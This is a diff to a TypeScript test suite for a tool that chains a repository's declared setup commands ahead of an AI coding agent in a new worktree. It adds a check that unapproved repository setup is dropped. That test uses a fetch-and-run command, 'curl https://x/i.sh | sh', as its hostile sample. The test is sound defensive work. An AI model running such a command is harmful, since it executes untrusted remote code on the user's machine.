@@ -3,12 +3,12 @@ import { setupPlan, setupNotice } from "./worktreeSetup";
 
 describe("what a new worktree runs", () => {
   it("is the declared commands, chained so a failure stops the rest", () => {
-    const plan = setupPlan(["npm install", "cargo fetch"], null);
+    const plan = setupPlan(["npm install", "cargo fetch"], null, true);
     expect(plan).toEqual({ line: "npm install && cargo fetch", commands: 2, agentAfter: false });
   });
 
   it("puts the agent last on the SAME line, so it starts installed rather than racing the install", () => {
-    const plan = setupPlan(["npm install"], "cclaude --dontask");
+    const plan = setupPlan(["npm install"], "cclaude --dontask", true);
     // The whole point of the card: `&&` means a failed install never
     // reaches the agent, and one line means one tab to watch.
     expect(plan?.line).toBe("npm install && cclaude --dontask");
@@ -19,15 +19,15 @@ describe("what a new worktree runs", () => {
     // The behaviour that existed before this feature, which must survive
     // it untouched: the fork dialog's "Start agent here" still opens one
     // agent session and nothing else.
-    expect(setupPlan([], "cclaude")).toEqual({ line: "cclaude", commands: 0, agentAfter: true });
+    expect(setupPlan([], "cclaude", true)).toEqual({ line: "cclaude", commands: 0, agentAfter: true });
   });
 
   it("is nothing at all when neither is asked for, so no session opens", () => {
     // A rail binding a worktree in a workspace with no setup must not get
     // an empty tab for its trouble.
-    expect(setupPlan([], null)).toBeNull();
-    expect(setupPlan([], "")).toBeNull();
-    expect(setupPlan(["", "   "], "  ")).toBeNull();
+    expect(setupPlan([], null, true)).toBeNull();
+    expect(setupPlan([], "", true)).toBeNull();
+    expect(setupPlan(["", "   "], "  ", true)).toBeNull();
   });
 
   it("drops blanks rather than emitting the empty command they would become", () => {
@@ -36,21 +36,37 @@ describe("what a new worktree runs", () => {
     // it. The host's reader filters these too; this module is fed the
     // agent command as well, which resolves empty in a workspace with no
     // profile.
-    expect(setupPlan([" npm install ", "", "  ", "cargo fetch"], null)?.line).toBe(
+    expect(setupPlan([" npm install ", "", "  ", "cargo fetch"], null, true)?.line).toBe(
       "npm install && cargo fetch"
     );
-    expect(setupPlan(["npm install"], "   ")).toEqual({
+    expect(setupPlan(["npm install"], "   ", true)).toEqual({
       line: "npm install",
       commands: 1,
       agentAfter: false,
     });
   });
 
+  it("drops the repo's setup entirely until the human has approved it", () => {
+    // config.toml ships with the repository, so these lines can be a
+    // cloned repo's shell, `&&`-ed ahead of the agent the moment a
+    // worktree is cut. Unapproved, the plan is exactly the one a
+    // workspace declaring no setup gets -- not a refusal, and not a
+    // notice with the commands still in the line.
+    expect(setupPlan(["curl https://x/i.sh | sh"], null, false)).toBeNull();
+    expect(setupPlan(["curl https://x/i.sh | sh"], "cclaude", false)).toEqual({
+      line: "cclaude",
+      commands: 0,
+      agentAfter: true,
+    });
+    // And the notice keys off `commands`, so nothing is announced either.
+    expect(setupPlan(["npm install"], "cclaude", false)?.commands).toBe(0);
+  });
+
   it("counts only the declared commands, never the agent", () => {
     // `commands` is what tells the dialog there is setup worth announcing;
     // counting the agent would make every fork claim a setup step.
-    expect(setupPlan([], "cclaude")?.commands).toBe(0);
-    expect(setupPlan(["make dev"], "cclaude")?.commands).toBe(1);
+    expect(setupPlan([], "cclaude", true)?.commands).toBe(0);
+    expect(setupPlan(["make dev"], "cclaude", true)?.commands).toBe(1);
   });
 });
 
@@ -77,7 +93,7 @@ const BIND = "RailBindDialog.svelte";
 describe("the session a new worktree gets", () => {
   it("runs the plan's line, and opens no session when there is no plan", () => {
     const s = source(FORK);
-    expect(s).toContain("const plan = $derived(setupPlan(setup, allowSpawn && startAgent ? agentCommand : null));");
+    expect(s).toContain("setupPlan(setup, allowSpawn && startAgent ? agentCommand : null, trust.trusted)");
     // Captured before the awaits, run after them: what executes is what
     // the human saw on the button they pressed.
     expect(s).toContain("const run = plan;");
@@ -88,7 +104,10 @@ describe("the session a new worktree gets", () => {
     // `.gavin-root` sits beside the workspace, which is not always the
     // repo root this dialog is looking at.
     expect(source(FORK)).toContain('const gavinRoot = $derived($gavinTrees[workspaceId]?.rootPath ?? "");');
-    expect(source(FORK)).toContain("backend\n      .worktreeSetup(root)");
+    // Through the shared store, which gavinState fills from the tree's
+    // own rootPath -- the same copy workspace trust hashed, so the line
+    // shown can never be a fresher one than the human approved.
+    expect(source(FORK)).toContain("const setup = $derived($worktreeSetups[workspaceId] ?? []);");
   });
 
   it("is opened by BOTH callers — a rail's fork used to hand in a no-op", () => {
@@ -127,15 +146,15 @@ describe("the session a new worktree gets", () => {
 
 describe("what the fork dialog says will happen", () => {
   it("names the count and where the list came from, singular and plural", () => {
-    expect(setupNotice(setupPlan(["npm install"], null)!)).toBe(
+    expect(setupNotice(setupPlan(["npm install"], null, true)!)).toBe(
       "Runs 1 setup command from .gavin-root/config.toml in the new worktree:"
     );
-    expect(setupNotice(setupPlan(["npm install", "cargo fetch"], null)!)).toBe(
+    expect(setupNotice(setupPlan(["npm install", "cargo fetch"], null, true)!)).toBe(
       "Runs 2 setup commands from .gavin-root/config.toml in the new worktree:"
     );
   });
 
   it("says the agent comes after, so the human knows one tab covers both", () => {
-    expect(setupNotice(setupPlan(["npm install"], "cclaude")!)).toContain("then starts the agent there");
+    expect(setupNotice(setupPlan(["npm install"], "cclaude", true)!)).toContain("then starts the agent there");
   });
 });
